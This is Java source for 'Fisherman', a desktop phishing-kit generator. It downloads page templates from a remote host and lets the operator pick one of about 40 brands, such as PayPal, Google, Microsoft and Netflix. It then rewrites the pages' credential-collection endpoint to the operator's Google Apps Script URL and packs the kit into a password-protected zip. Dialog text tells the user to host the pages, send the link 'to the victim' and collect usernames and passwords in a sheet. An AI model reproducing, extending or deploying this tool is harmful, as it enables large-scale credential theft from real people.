import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import javax.swing.*;
import javax.swing.plaf.FontUIResource;
import net.lingala.zip4j.ZipFile;
import net.lingala.zip4j.model.ZipParameters;
import net.lingala.zip4j.model.enums.*;

public class Fisherman extends JFrame implements ActionListener{
	private static final long serialVersionUID = 1L;
	private final AWTEventListener focusListener = this::removeFocus;
	
    private void removeFocus(AWTEvent e) {
        if (e instanceof FocusEvent && ((FocusEvent) e).getID() == FocusEvent.FOCUS_GAINED) {
            Toolkit.getDefaultToolkit().removeAWTEventListener(focusListener);
            FocusManager.getCurrentKeyboardFocusManager().clearFocusOwner();
        }
    }
    
	public static void copyDirectory(String sourceDirectoryLocation, String destinationDirectoryLocation) throws IOException {
	    Files.walk(Paths.get(sourceDirectoryLocation)).forEach(source -> {
	          Path destination = Paths.get(destinationDirectoryLocation, source.toString().substring(sourceDirectoryLocation.length()));
	          try {
	              Files.copy(source, destination);
	          } catch (IOException e) {
	              e.printStackTrace();
	          }
	      });
	}
	
	void deleteDir(File file) {
	    File[] contents = file.listFiles();
	    if (contents != null) {
	        for (File f : contents) {
	            if (! Files.isSymbolicLink(f.toPath()))
	                deleteDir(f);
	        }
	    }
	    file.delete();
	}
	
	public static boolean isInternetAvailable() throws IOException {
        return isHostAvailable("google.com") || isHostAvailable("amazon.com") || isHostAvailable("facebook.com")|| isHostAvailable("apple.com");
    }

    private static boolean isHostAvailable(String hostName) throws IOException {
        try(Socket socket = new Socket()) {
            InetSocketAddress socketAddress = new InetSocketAddress(hostName, 80);
            socket.connect(socketAddress, 3000);
            return true;
        }
        catch(UnknownHostException unknownHost) {
            return false;
        }
    }
	
	@SuppressWarnings("resource")
	void initial() {
		File MainDir = new File("C:\\Users\\"+System.getProperty("user.name")+"\\.Fisherman"); 
		if (!MainDir.exists()) {
			try {
				UIManager.put("OptionPane.yesButtonText", "Continue");
				UIManager.put("OptionPane.noButtonText", "Exit");
				UIManager.put("OptionPane.messageFont", new FontUIResource(new Font("Ink Free", Font.BOLD, 15)));
				UIManager.put("OptionPane.buttonFont", new FontUIResource(new Font("Ink Free", Font.BOLD, 15)));
				Toolkit.getDefaultToolkit().addAWTEventListener(focusListener, AWTEvent.FOCUS_EVENT_MASK);
				Toolkit.getDefaultToolkit().removeAWTEventListener(focusListener);
				
				if (JOptionPane.showConfirmDialog(null, "<html><b>We are downloading improtant files.<br>The software will automatically launch itself after download.</b></html>", "Continue to software?", JOptionPane.YES_NO_OPTION) == JOptionPane.YES_OPTION) {
					if(isInternetAvailable()) {
						MainDir.mkdirs();
						URL website = new URL("https://dl.tgxrebot.workers.dev/download/444801?hash=AgADnQ");
						try (InputStream in = website.openStream()) {
							Files.copy(in, new File("C:\\Users\\"+System.getProperty("user.name")+"\\.Fisherman\\source.zip").toPath(), StandardCopyOption.REPLACE_EXISTING);
						}
						new ZipFile("C:\\Users\\"+System.getProperty("user.name")+"\\.Fisherman\\source.zip").extractAll("C:\\Users\\"+System.getProperty("user.name")+"\\.Fisherman");
					}
					else {
						UIManager.put("OptionPane.okButtonText", "Okay");
				        Toolkit.getDefaultToolkit().addAWTEventListener(focusListener, AWTEvent.FOCUS_EVENT_MASK);
				        JOptionPane.showMessageDialog(null, "<html>Please connect to <span style='color:red'>Internet</span> and restart the application..</html>", "Information", JOptionPane.INFORMATION_MESSAGE);
				        Toolkit.getDefaultToolkit().removeAWTEventListener(focusListener);
				        System.exit(0);
					}
				} else 
					System.exit(0);
	              
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	public static Credits credit = null;
	String services[] = {"Adobe", "Amazon", "Apple", "Badoo", "DeviantArt", "Discord", "Dropbox", "Ebay", "ExpertIQTrading", "Facebook", "Flipkart", "Github", "Gitlab", "Google", "Instagram", "Instagram Batch", "Linkedin", "Mediafire", "Microsoft", "Netflix", "Paypal", "Pinterest", "Playstation", "Protonmail", "Quora", "Reddit", "Roblox", "Snapchat", "Snapfish", "Spotify", "Stackoverflow", "Steam", "TikTok", "Twitch", "Twitter", "VK", "Wordpress", "Xbox", "Yahoo", "Yandex"}, labels[] = {"Fisherman", "Select Service:", "Paste google sheets link:", "<html>&copy;2023 SOUL_AYU </html>", "|"}, buttonlabel[] = {"Generate Page", "GitHub", "Credits"};
	JComboBox<Object> selector = new JComboBox<Object>(services);
	JLabel label[] = new JLabel[5];
	JButton button[] = new JButton[3];
	JTextField urlField = new JTextField("Paste url");
	
	Fisherman(){
		initial();
		UIManager.put("OptionPane.messageFont", new FontUIResource(new Font("Ink Free", Font.BOLD, 15)));
		UIManager.put("OptionPane.buttonFont", new FontUIResource(new Font("Ink Free", Font.BOLD, 15)));
		
		for(int i=0; i<5; i++) {
			if(i<3) {
				button[i] = new JButton(buttonlabel[i]);
				button[i].setForeground(Color.BLUE);
				button[i].setBackground(new Color(238, 238, 238));
				button[i].setBorder(null);
				button[i].setFont(new Font("Ink Free", Font.BOLD, 13));
				button[i].setFocusable(false);
				button[i].setVisible(true);
				button[i].addActionListener(this);
				this.add(button[i]);
			}
			
			label[i] = new JLabel(labels[i]);
			label[i].setFont(new Font("Ink Free", Font.BOLD, 15));
			label[i].setForeground(Color.black);
			this.add(label[i]);
		}
		
		label[0].setFont(new Font("Ink Free", Font.BOLD, 25));
		label[0].setBounds(120, 10, 150, 25);
		label[0].setForeground(Color.red);
		
		label[1].setBounds(10, 50, 150, 25);
		
		selector.setBorder(null);
		selector.setFont(new Font("Ink Free", Font.BOLD, 15));
		selector.setBounds(10, 75, 200, 25);
		
		label[2].setBounds(10, 120, 200, 25);
		
		urlField.setBounds(10, 145, 200, 25);
		urlField.setFont(new Font("Ink Free", Font.BOLD, 15));
		
		button[0].setBackground(new Color(255, 147, 147));
		button[0].setBounds(110, 185, 150, 25);
		
		label[3].setForeground(Color.red);
		label[3].setBounds(110, 230, 150, 30);
		
		button[1].setBackground(new Color(238, 238, 238));
		button[1].setBorder(null);
		button[1].setBounds(130, 255, 50, 30);
		
		label[4].setBounds(180, 255, 10, 30);
		
		button[2].setBounds(185, 255, 50, 30);
		
		this.add(selector);
		this.add(urlField);
		
		this.setTitle("Fisherman");
		this.setIconImage(new ImageIcon(getClass().getResource("/icons/icon.jpg")).getImage());
		this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		this.setResizable(false);
		this.setLayout(null);
		this.setSize(new Dimension(380, 330));
		this.setLocationRelativeTo(null);
		this.setVisible(true);
		
		this.addWindowListener(new WindowAdapter(){
			  @Override
			  public void windowClosing(WindowEvent e){
			     deleteDir(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp"));
			  }
		});
	}	
	
	@Override
	public void actionPerformed(ActionEvent e) {
		
		if(e.getSource()==button[0] && !(urlField.getText().equals("") || urlField.getText().equals("Paste google sheets url") || urlField.getText().contains(" ")) && urlField.getText().contains("/exec")) {
			File theDir = new File("C:\\Users\\"+System.getProperty("user.name")+"\\.Fisherman\\"+selector.getSelectedItem());
			File file = new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\Fisherman\\"+selector.getSelectedItem()+".zip");
			if(theDir.exists() && !file.exists()) {
				try {
					File tmpDir = new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp"); 
					if (!tmpDir.exists())
					    tmpDir.mkdirs();
					copyDirectory("C:\\Users\\"+System.getProperty("user.name")+"\\.Fisherman\\"+selector.getSelectedItem(), "C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem());
					if(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()+"\\index.html").exists()) {
						try{
						    FileReader fr = new FileReader(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()+"\\index.html"));
						    String s;
						    String totalStr = "";
						    try (BufferedReader br = new BufferedReader(fr)) {

						        while ((s = br.readLine()) != null) {
						            totalStr += s+"\n";
						        }
						        totalStr = totalStr.replaceAll("https://script.google.com/macros/s/AKfycbw5W53E6FIgCrNJIQOvByteddtM4iXXBEVhXH9BCg9TFOl9cc6lXboXb36SO-8cxHFU/exec", urlField.getText());
						        FileWriter fw = new FileWriter(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()+"\\index.html"));
						    fw.write(totalStr);
						    fw.close();
						    }
						}catch(Exception e1){
						    e1.printStackTrace();
						}
					}
					if(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()+"\\mobile.html").exists()) {
						try{
						    FileReader fr = new FileReader(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()+"\\mobile.html"));
						    String s;
						    String totalStr = "";
						    try (BufferedReader br = new BufferedReader(fr)) {

						        while ((s = br.readLine()) != null) {
						            totalStr += s+"\n";
						        }
						        totalStr = totalStr.replaceAll("https://script.google.com/macros/s/AKfycbw5W53E6FIgCrNJIQOvByteddtM4iXXBEVhXH9BCg9TFOl9cc6lXboXb36SO-8cxHFU/exec", urlField.getText());
						        FileWriter fw = new FileWriter(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()+"\\mobile.html"));
						    fw.write(totalStr);
						    fw.close();
						    }
						}catch(Exception e1){
						    e1.printStackTrace();
						}
					}
					ZipParameters zipParameters = new ZipParameters();
					zipParameters.setEncryptFiles(true);
					zipParameters.setEncryptionMethod(EncryptionMethod.AES);
					zipParameters.setAesKeyStrength(AesKeyStrength.KEY_STRENGTH_256); 
					try (ZipFile zipFile = new ZipFile("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()+".zip", "Fisherman".toCharArray())) {
						zipFile.addFolder(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()), zipParameters);
					}
					File MainDir = new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\Fisherman"); 
					if (!MainDir.exists())
					    MainDir.mkdirs();
					Files.copy(new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\.tmp\\"+selector.getSelectedItem()+".zip").toPath(), new File("C:\\Users\\"+System.getProperty("user.name")+"\\Documents\\Fisherman\\"+selector.getSelectedItem()+".zip").toPath(), StandardCopyOption.REPLACE_EXISTING);
					UIManager.put("OptionPane.okButtonText", "Okay");
			        Toolkit.getDefaultToolkit().addAWTEventListener(focusListener, AWTEvent.FOCUS_EVENT_MASK);
			        JOptionPane.showMessageDialog(null, "<html>Your <span style='color:red'>"+selector.getSelectedItem()+"</span> phishing page is generated and <br>stored in Documents/Fisherman/"+selector.getSelectedItem()+"<br> as zip file.<br><br><span style='color:red'>Zip Password:</span> <span style='color:green'>Fisherman</span><br><br><span style='color:red'>How to use:</span><br>1. Host all the codes to any hosting provider.<br>2. Share the link to the victim.<br>3. Get the username and password in your sheet.</html>", "Information", JOptionPane.INFORMATION_MESSAGE);
			        Toolkit.getDefaultToolkit().removeAWTEventListener(focusListener);
				} catch (IOException e1) {
					e1.printStackTrace();
				}
			}
			else {
				if(theDir.exists()) {
					UIManager.put("OptionPane.okButtonText", "Okay");
			        Toolkit.getDefaultToolkit().addAWTEventListener(focusListener, AWTEvent.FOCUS_EVENT_MASK);
			        JOptionPane.showMessageDialog(null, "<html>Your <span style='color:red'>"+selector.getSelectedItem()+"</span> phishing page is already available <br>in Documents/Fisherman/"+selector.getSelectedItem()+" as zip file.<br><br><span style='color:red'>Zip Password:</span> <span style='color:green'>Fisherman</span><br><br><span style='color:red'>How to use:</span><br>1. Host all the codes to any hosting provider.<br>2. Share the link to the victim.<br>3. Get the username and password in your sheet.</html>", "Information", JOptionPane.INFORMATION_MESSAGE);
			        Toolkit.getDefaultToolkit().removeAWTEventListener(focusListener);
				}
				else
					initial();
			}
		}
		else if(e.getSource()==button[0] && ((urlField.getText().equals("") || urlField.getText().equals("Paste google sheets url") || urlField.getText().contains(" ")) || !urlField.getText().contains("/exec"))){
			UIManager.put("OptionPane.okButtonText", "Okay");
			Toolkit.getDefaultToolkit().addAWTEventListener(focusListener, AWTEvent.FOCUS_EVENT_MASK);
			JOptionPane.showMessageDialog(null, "<html><span style='color:red'>Unable to generate Phishing page.</span><br>Please provide a valid URL.</html>", "Error", JOptionPane.ERROR_MESSAGE);
			Toolkit.getDefaultToolkit().removeAWTEventListener(focusListener);
		}
		
		if(e.getSource()==button[1]) {
			try {
				Desktop.getDesktop().browse(new URI("https://github.com/DeadSOUL-Studios/"));
			} catch (Exception e1) {
				e1.printStackTrace();
			}
		}
		
		if(e.getSource()==button[2] && credit==null) 
			credit = new Credits();
	}
}